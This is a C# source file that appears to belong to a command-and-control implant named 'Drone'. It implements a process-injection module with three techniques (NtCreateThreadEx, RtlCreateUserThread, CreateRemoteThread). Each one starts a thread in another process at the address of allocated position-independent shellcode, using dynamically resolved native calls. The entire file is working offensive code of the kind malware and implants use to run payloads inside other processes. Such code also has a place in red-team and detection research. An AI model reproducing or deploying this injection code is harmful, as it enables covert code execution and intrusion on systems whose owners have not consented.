using System;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;

namespace Drone.Invocation.Injection
{
    public abstract class ExecutionTechnique
    {
        protected abstract IEnumerable<Type> SupportedPayloads { get; }

        public virtual bool IsSupportedPayloadType(PayloadType payload)
            => SupportedPayloads.Contains(payload.GetType());

        public abstract bool Inject(PayloadType payload, AllocationTechnique allocationTechnique, Process process);
    }

    public class NtCreateThreadEx : ExecutionTechnique
    {
        protected override IEnumerable<Type> SupportedPayloads { get; }
            = new[] { typeof(PICPayload) };
        
        public override bool Inject(PayloadType payload, AllocationTechnique allocationTechnique, Process process)
        {
            var baseAddress = allocationTechnique.Allocate(payload, process);
            return Inject(baseAddress, process);
        }

        private bool Inject(IntPtr baseAddress, Process process)
        {
            var hThread = new IntPtr();

            var result = DynamicInvoke.Native.NtCreateThreadEx(
                ref hThread,
                Data.Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Data.Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,
                IntPtr.Zero,
                process.Handle, baseAddress, IntPtr.Zero,
                false, 0, 0, 0, IntPtr.Zero);
            
            if (result != Data.Native.NTSTATUS.Success) return false;

            DynamicInvoke.Win32.Kernel32.CloseHandle(hThread);
            return true;   
        }
    }

    public class RtlCreateUserThread : ExecutionTechnique
    {
        protected override IEnumerable<Type> SupportedPayloads { get; }
            = new[] { typeof(PICPayload) };
        
        public override bool Inject(PayloadType payload, AllocationTechnique allocationTechnique, Process process)
        {
            var baseAddress = allocationTechnique.Allocate(payload, process);
            return Inject(baseAddress, process);
        }

        private bool Inject(IntPtr baseAddress, Process process)
        {
            var hThread = new IntPtr();
            
            var result = DynamicInvoke.Native.RtlCreateUserThread(
                process.Handle,
                IntPtr.Zero,
                false,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                baseAddress,
                IntPtr.Zero, ref hThread, IntPtr.Zero);
            
            if (result != Data.Native.NTSTATUS.Success) return false;

            DynamicInvoke.Win32.Kernel32.CloseHandle(hThread);
            return true;  
        }
    }

    public class CreateRemoteThread : ExecutionTechnique
    {
        protected override IEnumerable<Type> SupportedPayloads { get; }
            = new[] { typeof(PICPayload) };
        
        public override bool Inject(PayloadType payload, AllocationTechnique allocationTechnique, Process process)
        {
            var baseAddress = allocationTechnique.Allocate(payload, process);
            return Inject(baseAddress, process);
        }

        private bool Inject(IntPtr baseAddress, Process process)
        {
            var threadId = new IntPtr();

            var hThread = DynamicInvoke.Win32.Kernel32.CreateRemoteThread(
                process.Handle,
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                ref threadId);

            if (hThread == IntPtr.Zero) return false;

            DynamicInvoke.Win32.Kernel32.CloseHandle(hThread);
            DynamicInvoke.Win32.Kernel32.CloseHandle(threadId);
            
            return true;
        }
    }
}